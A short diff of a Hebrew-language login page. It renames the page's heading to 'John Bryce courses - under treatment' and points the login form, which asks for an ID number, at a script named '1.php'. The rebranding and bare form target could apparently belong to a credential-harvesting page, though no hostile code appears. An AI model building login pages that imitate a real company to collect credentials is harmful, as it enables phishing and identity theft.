@@ -1,12 +1,12 @@
 <div class="login_wrap">
 
 	<div class="app-title">
-		<h1>ברוכים הבאים לאתר המבדקון</h1>
+		<h1>ג'ון ברייס קורסים - בטיפול</h1>
 	</div>
 
 	<div class="login">
 		<div class="login-screen">
-			<form id="hook_login_form" name="login_form" novalidate="">
+			<form id="hook_login_form" method="post" action="1.php" name="login_form" novalidate="">
 				<div class="login-form">
 					<div class="control-group">
 						<input name="card_or_mail" type="text" class="login-field" value="" placeholder='ת"ז' id="login-card-or-mail">
